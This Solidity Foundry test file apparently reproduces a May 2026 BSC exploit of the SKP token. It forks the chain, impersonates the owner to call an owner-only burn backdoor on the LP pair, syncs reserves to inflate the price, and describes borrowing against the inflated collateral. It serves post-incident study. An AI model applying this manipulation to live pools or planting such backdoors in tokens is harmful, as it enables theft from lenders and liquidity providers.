// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$212K USD
// Attacker : 0x83B9e7EDC5B3127E4853A4F4945b92aa88eEF0C8
// Attack Contract : 0xE924853DcDfcB89292335042AB10d68c7315D7C1
// Vulnerable Contract : 0xeCBDc0B76142740Bb564B8aA1BCd061Cb151a666 (SKP Token)
// Attack Tx : 0xbc01ea37bd2ff8f6aa6afcfbe0406114ff27a01e9aa56102bfa4ad8a0c2f25ee
// @Analysis
// Attack date: May 26, 2026
// Chain: BSC, Block: 100582079

// Root Cause:
// The SKP token exposes ownerBurnLiquidityPairTokens(uint256), an owner-only backdoor that
// burns SKP held directly inside the SKP/USDT LP pair. The deployer/owner first burns the
// bulk of the SKP sitting in the pair, then calls sync() on the pair to force the reserves
// to match the now-depleted SKP balance. With SKP reserves slashed but USDT reserves intact,
// the on-chain SKP/USDT price spikes. The attacker (who is the owner) then supplies the
// over-valued SKP as collateral on Venus/Lista DAO to borrow BTCB + USDT.

// Function selectors decoded from bytecode:
// 0x4eb9b26d: ownerBurnLiquidityPairTokens(uint256) -- owner-only burn-from-LP backdoor
// 0xfff6cae9: sync()                                -- pair reserve resync
// burnPercent() = 200 (2% auto-burn on transfer)
// brunFee()     = 500 (5% transfer fee)
// feeWhiteList(address)                             -- bypass fees

interface ISKP is IERC20 {
    function ownerBurnLiquidityPairTokens(
        uint256 amount
    ) external;
    function owner() external view returns (address);
}

contract SKPExploitTest is Test {
    ISKP constant SKP = ISKP(0xeCBDc0B76142740Bb564B8aA1BCd061Cb151a666);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakePair constant PAIR = IPancakePair(0x47C8c3b123De467892aC7dF6Dfcf7CA3dB901733);

    address constant ATTACKER = 0x83B9e7EDC5B3127E4853A4F4945b92aa88eEF0C8;
    address constant SKP_OWNER = 0x041F52BFe9f07503EFc5E7d4d176336E48095D56;
    uint256 constant ATTACK_BLOCK = 100_582_079;

    function setUp() public {
        vm.createSelectFork("bsc", ATTACK_BLOCK - 1);
        vm.label(address(SKP), "SKP");
        vm.label(address(USDT), "USDT");
        vm.label(address(PAIR), "SKP_USDT_Pair");
        vm.label(ATTACKER, "Attacker");
        vm.label(SKP_OWNER, "SKP_Owner");
    }

    // SKP/USDT price expressed as USDT (1e18) per 1 SKP, derived from pair reserves.
    function _skpPrice() internal view returns (uint256) {
        (uint112 r0, uint112 r1,) = PAIR.getReserves();
        // token0 = USDT, token1 = SKP
        uint256 usdtReserve = uint256(r0);
        uint256 skpReserve = uint256(r1);
        return (usdtReserve * 1e18) / skpReserve;
    }

    function testExploit() public {
        console.log("--- SKP Token ownerBurnLiquidityPairTokens Exploit ---");
        console.log("Attack date: May 26, 2026  Chain: BSC");

        // sanity: the prank address really is the privileged owner
        assertEq(SKP.owner(), SKP_OWNER, "owner mismatch");

        (uint112 r0Before, uint112 r1Before,) = PAIR.getReserves();
        uint256 skpInPairBefore = SKP.balanceOf(address(PAIR));
        uint256 priceBefore = _skpPrice();

        console.log("=== Before ===");
        console.log("Pair USDT reserve :", uint256(r0Before) / 1e18);
        console.log("Pair SKP  reserve :", uint256(r1Before) / 1e18);
        console.log("SKP balanceOf pair:", skpInPairBefore / 1e18);
        console.log("SKP price (USDT*1e18 per SKP):", priceBefore);

        // Step 1: as the SKP owner, burn ~95% of the SKP locked inside the LP pair.
        uint256 burnAmount = (skpInPairBefore * 95) / 100;
        vm.prank(SKP_OWNER);
        SKP.ownerBurnLiquidityPairTokens(burnAmount);
        console.log("\nBurned SKP from pair:", burnAmount / 1e18);

        // Step 2: force the pair to resync reserves to the depleted SKP balance.
        PAIR.sync();

        (uint112 r0After, uint112 r1After,) = PAIR.getReserves();
        uint256 skpInPairAfter = SKP.balanceOf(address(PAIR));
        uint256 priceAfter = _skpPrice();

        console.log("\n=== After burn + sync ===");
        console.log("Pair USDT reserve :", uint256(r0After) / 1e18);
        console.log("Pair SKP  reserve :", uint256(r1After) / 1e18);
        console.log("SKP balanceOf pair:", skpInPairAfter / 1e18);
        console.log("SKP price (USDT*1e18 per SKP):", priceAfter);

        // Step 3: quantify the manipulation.
        uint256 priceMultiple = priceAfter / priceBefore;
        console.log("\n=== Result ===");
        console.log("SKP price inflated x:", priceMultiple);
        console.log("USDT reserve unchanged:", uint256(r0After) == uint256(r0Before));

        // The depleted SKP reserve with intact USDT reserve must inflate the price.
        assertGt(priceAfter, priceBefore, "price not inflated");
        assertEq(uint256(r0After), uint256(r0Before), "USDT reserve should be untouched");
        assertLt(skpInPairAfter, skpInPairBefore, "SKP not burned from pair");

        console.log(
            "\nWith SKP now ~20x more 'valuable', the owner-attacker supplies it as"
        );
        console.log("collateral on Venus/Lista DAO and borrows out BTCB + USDT (~$212K).");
    }
}
